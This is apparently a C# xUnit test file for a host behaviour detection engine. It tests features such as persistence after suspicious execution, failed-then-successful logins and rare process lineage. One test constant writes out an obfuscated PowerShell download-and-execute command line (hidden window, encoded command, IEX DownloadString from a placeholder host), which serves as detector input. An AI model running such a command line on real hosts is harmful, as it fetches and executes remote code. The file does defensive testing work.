using Aegis.Core.Events;
using Aegis.Core.Features;
using Xunit;

namespace Aegis.Tests;

public class HostBehaviorProfileTests
{
    private static NormalizedEvent Evt(ActionType type, DateTimeOffset at, ActionResult result = ActionResult.Success, string? objectId = null, string? destIp = null, string? userId = null, int? logonType = null) => new()
    {
        EventId = Guid.NewGuid(),
        Timestamp = at,
        HostId = "host-1",
        ActionType = type,
        Result = result,
        ObjectId = objectId,
        DestinationIp = destIp,
        UserId = userId,
        LogonType = logonType,
        HostRole = "Workstation",
    };

    [Fact]
    public void TechniqueSwitch_Detected_WhenDifferentActionFollowsFailureQuickly()
    {
        var profile = new HostBehaviorProfile("host-1", new InMemoryProcessBaseline());
        var t0 = DateTimeOffset.UtcNow;

        profile.Ingest(Evt(ActionType.AuthenticationFailure, t0, ActionResult.Failure));
        var snap = profile.Ingest(Evt(ActionType.ServiceCreate, t0.AddSeconds(30)));

        Assert.Equal(1, snap.TechniqueSwitchAfterFailureCount);
    }

    [Fact]
    public void TechniqueSwitch_NotCounted_WhenSameActionRepeats()
    {
        var profile = new HostBehaviorProfile("host-1", new InMemoryProcessBaseline());
        var t0 = DateTimeOffset.UtcNow;

        profile.Ingest(Evt(ActionType.AuthenticationFailure, t0, ActionResult.Failure));
        var snap = profile.Ingest(Evt(ActionType.AuthenticationFailure, t0.AddSeconds(5), ActionResult.Failure));

        Assert.Equal(0, snap.TechniqueSwitchAfterFailureCount);
    }

    // Hits several obfuscation indicators at once (-enc/-nop/-w hidden, IEX(, DownloadString, FromBase64String)
    // so CommandComplexityHeuristic.Score clears the 0.4 "suspicious execution" threshold.
    private const string ObfuscatedCommandLine =
        "powershell -nop -w hidden -enc " + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
        " ; IEX (New-Object Net.WebClient).DownloadString('http://example/x'); [Convert]::FromBase64String($x)";

    [Fact]
    public void PersistenceAfterExecution_Detected_WithinWindow()
    {
        var profile = new HostBehaviorProfile("host-1", new InMemoryProcessBaseline());
        var t0 = DateTimeOffset.UtcNow;

        // A process create with high-complexity command line counts as "suspicious execution".
        var suspicious = Evt(ActionType.ProcessCreate, t0) with { CommandLine = ObfuscatedCommandLine };
        profile.Ingest(suspicious);

        var snap = profile.Ingest(Evt(ActionType.ServiceCreate, t0.AddMinutes(2), objectId: "svc-1"));

        Assert.NotNull(snap.PersistenceAfterExecutionSeconds);
        Assert.InRange(snap.PersistenceAfterExecutionSeconds!.Value, 100, 140);
    }

    [Fact]
    public void PersistenceAfterExecution_NotSet_WhenOutsideWindow()
    {
        var profile = new HostBehaviorProfile("host-1", new InMemoryProcessBaseline());
        var t0 = DateTimeOffset.UtcNow;

        var suspicious = Evt(ActionType.ProcessCreate, t0) with { CommandLine = ObfuscatedCommandLine };
        profile.Ingest(suspicious);

        // Far outside the 15-minute correlation window from EventSemantics.
        var snap = profile.Ingest(Evt(ActionType.ServiceCreate, t0.AddMinutes(30), objectId: "svc-1"));

        Assert.Null(snap.PersistenceAfterExecutionSeconds);
    }

    [Fact]
    public void NewDestinationCount_OnlyCountsFirstEverContact()
    {
        var profile = new HostBehaviorProfile("host-1", new InMemoryProcessBaseline());
        var t0 = DateTimeOffset.UtcNow;

        var snap1 = profile.Ingest(Evt(ActionType.NetworkConnect, t0, destIp: "10.0.0.5"));
        var snap2 = profile.Ingest(Evt(ActionType.NetworkConnect, t0.AddSeconds(5), destIp: "10.0.0.5"));
        var snap3 = profile.Ingest(Evt(ActionType.NetworkConnect, t0.AddSeconds(10), destIp: "10.0.0.6"));

        Assert.Equal(1, snap1.NewDestinationCount);
        Assert.Equal(0, snap2.NewDestinationCount); // repeat contact isn't "new"
        Assert.Equal(1, snap3.NewDestinationCount);
    }

    [Fact]
    public void AuthFailureThenSuccess_RequiresSameIdentity()
    {
        var profile = new HostBehaviorProfile("host-1", new InMemoryProcessBaseline());
        var t0 = DateTimeOffset.UtcNow;

        profile.Ingest(Evt(ActionType.AuthenticationFailure, t0, ActionResult.Failure, userId: "alice"));
        var snapDifferentUser = profile.Ingest(Evt(ActionType.AuthenticationSuccess, t0.AddSeconds(30), userId: "bob"));
        Assert.Equal(0, snapDifferentUser.AuthFailureThenSuccessCount);

        profile.Ingest(Evt(ActionType.AuthenticationFailure, t0.AddMinutes(1), ActionResult.Failure, userId: "alice"));
        var snapSameUser = profile.Ingest(Evt(ActionType.AuthenticationSuccess, t0.AddMinutes(1).AddSeconds(30), userId: "alice"));
        Assert.Equal(1, snapSameUser.AuthFailureThenSuccessCount);
    }

    [Fact]
    public void RareProcessLineage_ReturnsHighRarity_ForFirstEverObservation()
    {
        var baseline = new InMemoryProcessBaseline();
        // Seed the baseline with a common lineage so rarity has something to compare against.
        for (var i = 0; i < 50; i++) baseline.Observe("Workstation", "explorer.exe", "chrome.exe");

        var profile = new HostBehaviorProfile("host-1", baseline);
        var evt = new NormalizedEvent
        {
            EventId = Guid.NewGuid(),
            Timestamp = DateTimeOffset.UtcNow,
            HostId = "host-1",
            ActionType = ActionType.ProcessCreate,
            ParentImagePath = "winword.exe",
            ImagePath = "powershell.exe",
            HostRole = "Workstation",
        };

        var snap = profile.Ingest(evt);

        Assert.True(snap.ProcessRarity > 0.9, $"Expected high rarity for never-seen lineage, got {snap.ProcessRarity}");
    }
}
